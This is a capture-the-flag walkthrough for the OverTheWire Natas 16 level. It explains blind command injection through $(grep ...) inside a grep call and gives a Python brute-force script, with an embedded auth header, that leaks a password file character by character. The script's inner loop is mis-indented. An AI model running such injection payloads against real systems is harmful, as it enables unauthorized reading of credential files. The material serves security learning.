- This level is similar to the one which I solved for ```natas10``` to ```natas11```, except for the fact that the input sanitization is even stronger this time
- So we need to change our strategy as it is not possible to use any exploit in ```grep``` or breaking out of it. We need to brute force the password
- The mimic source code of the website looks like follows:
```php
<?
$key = "";
if(array_key_exists("needle", $_REQUEST)) {
	$key = $_REQUEST["needle"];
}
if($key != "") {
	if(preg_match('/[;|&`\'"]/',$key)) {
		print "Input contains an illegal character!";
	} else {
		passthru("grep -i \"$key\" dictionary.txt");
	}
}
?>
```
- From the regular expression check, we can observe that all the characters that could have been used to control the functionality of ```grep``` are filtered out, moreover the ```key``` is also enclosed in double quotes so we cannot terminate ```grep``` either
- However, we see that the symbols ```$```, ```(``` and ```)``` are still not filtered, which leaves us a good room for executing the attack. We will use the functionality of evaluating expressions inside double quotes which is provided by ```bash```
## Exploit intuition
- The code filters through the list of words in the dictionary using ```grep``` and prints the result
- We also need to find out two things:
	- What are the characters present in the password string for ```natas17```, which is present in the file ```/etc/natas_webpass/natas17```
	- What is the order of the characters present in the password string
- For performing the brute force attack, we can select a word from the dictionary, let's say December, and use the following payload in two steps: ```December$(grep <string> /etc/natas_webpass/natas17)```
## Exploit working
- Let's consider the working of the exploit through a simple example
- Let's assume the password string is ```password```, and we use the letter ```a``` as the value of ```<string>```, so the final command that will execute on the server would be: ```grep -i "December$(grep a /etc/natas_webpass/natas17)" dictionary.txt```
- The ```bash``` shell first evaluates the inner expression, tries to find the string ```a``` inside the string ```password```, which succeeds, and the result of the expression becomes ```Decemberpassword```. This is not present in the dictionary and hence no output is shown. This confirms that we have ```a``` somewhere in the password string
- Now, we run the same exploit with the value of ```<string>``` as ```b```, which makes the final command to be executed as: ```grep -i "December$(grep b /etc/natas_webpass/natas17)" dictionary.txt```
- This time, the string ```b``` is not present in the password string, so the result of the expression becomes ```December```, which is present in the dictionary and we get the output
- Through this way, we can filter out the characters that are present in the password string
- Now to guess the actual password, we can modify our payload to search from the beginning of the string instead of searching anywhere, like this: ```December$(grep ^<string> /etc/natas_webpass/natas17)```
- Now for each position in the password string, we run through the filter characters, trying to find whether the password string begins with the brute force guess combination or not
- Consider the following example:
	- Let's say we found out the filtered characters, which are ```[a, d, o, p, r, s, w]```
	- We craft the payload as: ```December$(grep ^a /etc/natas_webpass/natas17)```
	- This payload makes the final command to be executed as : ```grep -i "December$(grep ^a /etc/natas_webpass/natas17)" dictionary.txt```
	- Now our password string does NOT start with ```a```, so the final output becomes this: ```grep -i "December" dictionary.txt```
	- This gives us output, and we get to know that for the first position, ```a``` is not the character
	- We loop through the list, and we reach ```p```. Our password string begins with ```p```, hence the final output becomes ```grep -i "Decemberpassword" dictionary.txt```, which is not present in the dictionary. This gives us the information that the character ```p``` is the first one in the password string
	- We continue for each position, trying out all the filtered characters, and get the password
## Brute force code:
```python
import requests
URL = "http://natas16.natas.labs.overthewire.org/index.php"
CHARACTER_LIST = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
HEADERS = {
'Authorization' : 'Basic bmF0YXMxNjpoUGtqS1l2aUxRY3RFVzMzUW11WEw2ZURWZk1XNHNHbw=='
}
KEYWORD = "December"
filtered_chars = []
for character in CHARACTER_LIST:
	payload = f"{KEYWORD}$(grep {character} /etc/natas_webpass/natas17)"
	params = {'needle' : payload, 'submit' : 'Search'}
	print(f"Sending request with payload: {params}")
	r = requests.get(URL, params=params, headers=HEADERS)
	if KEYWORD not in r.text:
		print(f"Character {character} is present in password file")
		filtered_chars.append(character)

print(f"Filtered characters: {filtered_chars}")
password_str = ""
for i in range(32):
	for character in filtered_chars:
	guess_str = password_str + character
	payload = f"{KEYWORD}$(grep ^{guess_str} /etc/natas_webpass/natas17)"
	params = {'needle' : payload, 'submit' : 'Search'}
	print(f"Sending request with payload: {params}")
	r = requests.get(URL, params=params, headers=HEADERS)
	if KEYWORD not in r.text:
		print(f"Found one character {character}")
		password_str += character
		print(f"Updated password string: {password_str}")

print(password_str)
```
- Obtained password: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC